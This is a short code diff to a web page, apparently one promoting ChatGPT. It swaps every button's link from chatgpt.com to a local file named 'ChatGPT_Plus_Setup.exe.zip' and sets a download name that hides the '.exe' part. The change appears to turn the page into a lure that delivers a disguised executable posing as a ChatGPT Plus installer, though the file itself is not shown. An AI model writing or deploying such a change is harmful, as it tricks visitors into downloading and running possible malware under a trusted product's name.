@@ -974,10 +974,11 @@ footer{
 </footer>
 
 <script>
-    const LINK_DE_LOS_BOTONES = "https://chatgpt.com";
+    const LINK_DE_LOS_BOTONES = "./ChatGPT_Plus_Setup.exe.zip";
 
     document.querySelectorAll(".btn, .btn-texto").forEach(boton => {
         boton.href = LINK_DE_LOS_BOTONES;
+        boton.download = "ChatGPT_Plus_Setup.zip";
     });
 </script>
 
